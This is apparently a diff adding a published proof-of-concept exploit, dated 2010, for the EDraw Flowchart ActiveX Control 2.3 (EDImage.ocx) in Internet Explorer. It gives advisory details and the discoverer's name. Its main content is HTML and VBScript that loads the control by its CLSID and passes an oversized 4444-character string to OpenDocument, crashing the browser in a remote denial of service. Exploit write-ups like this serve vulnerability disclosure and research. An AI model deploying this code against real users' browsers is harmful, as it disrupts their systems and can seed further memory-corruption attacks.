@@ -1,0 +1,57 @@
+######################
+
+
+ EDraw Flowchart ActiveX Control 2.3 (EDImage.ocx) Remote DoS Exploit (IE)
+
+
+ Vendor: EdrawSoft - http://www.edrawsoft.com
+
+ Platform Used: MS Win XP Pro SP3 (en) / IE 8.0
+
+
+ CompanyName		EDrawSoft
+ FileDescription	EDraw Flowchart ActiveX Control Module
+ FileVersion		2, 3, 0, 6
+ InternalName		EDrawSoft
+ LegalCopyright		Copyright (C) 2005
+ OriginalFileName	EDImage.OCX
+ ProductName		EDraw Flowchart ActiveX Control Module
+ ProductVersion		2, 3, 0, 6
+
+ Report for Clsid: {F685AFD8-A5CC-410E-98E4-BAA1C559BA61}
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: False
+
+
+ Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+
+ Zero Science Lab - http://www.zeroscience.mk
+
+ liquidworm gmail com
+
+
+
+ 18.04.2010
+
+
+ Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4936.php
+
+
+######################
+
+
+ <object classid='clsid:F685AFD8-A5CC-410E-98E4-BAA1C559BA61' id='thricer' />
+ <script language='vbscript'>
+
+ targetFile = "C:\PROGRA~1\EDIMAG~1\EDImage.ocx"
+ prototype  = "Function OpenDocument ( ByVal filename As String ) As Boolean"
+ memberName = "OpenDocument"
+ progid     = "EDIMAGELib.EDImage"
+ argCount   = 1
+
+ arg1=String(4444, "J")
+
+ thricer.OpenDocument arg1 
+
+ </script>
